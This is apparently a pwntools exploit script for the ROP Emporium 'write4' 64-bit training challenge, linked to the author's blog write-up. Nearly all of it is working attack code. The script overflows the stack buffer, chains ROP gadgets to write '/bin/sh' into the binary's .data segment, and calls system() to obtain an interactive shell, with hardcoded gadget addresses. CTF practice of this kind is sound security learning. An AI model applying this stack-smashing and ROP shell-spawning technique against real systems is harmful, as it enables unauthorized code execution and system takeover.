#Author:    Christoffer.Claesson@Securitybits.io
#Blog:      https://blog.securitybits.io/2019/12/03/ropemporium-3-write4-64-bit/

#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *

exe = context.binary = ELF('write4')

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 31337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x{exe.symbols.main:x}
break *0x400890
break *0x400807
continue
'''.format(**locals())

def arbitrary_write(address, data):
    #0x400890: pop r14; pop r15; ret;
    #0x400820: mov qword ptr [r14], r15; ret;
    # pop reg
    # mov to_reg, from_reg
    # address > data > pop r14; pop r15; mov
    pop_regs = 0x400890
    mov_regs = 0x400820
    rop =  p64(pop_regs)
    rop += p64(address)
    rop += data
    rop += p64(mov_regs)
    return rop

# [0x00400650]> iS
# Nm Paddr       Size Vaddr      Memsz Perms Name
# 25 0x00001050    16 0x00601050    16 -rw- .data

#0x400893: pop rdi; ret;

system = 0x4005e0
data_segment = 0x601050
pop_rdi = 0x400893

junk = 'A'*40

payload = junk
payload += arbitrary_write(data_segment,"/bin/sh\x00")
payload += p64(pop_rdi)
payload += p64(data_segment)
payload += p64(system)

io = start()
io.recvuntil('> ')
io.sendline(payload)
io.interactive()

#Author:    Christoffer.Claesson@Securitybits.io
#Blog:      https://blog.securitybits.io/2019/08/17/ropemporium-2-callme-64-bit/
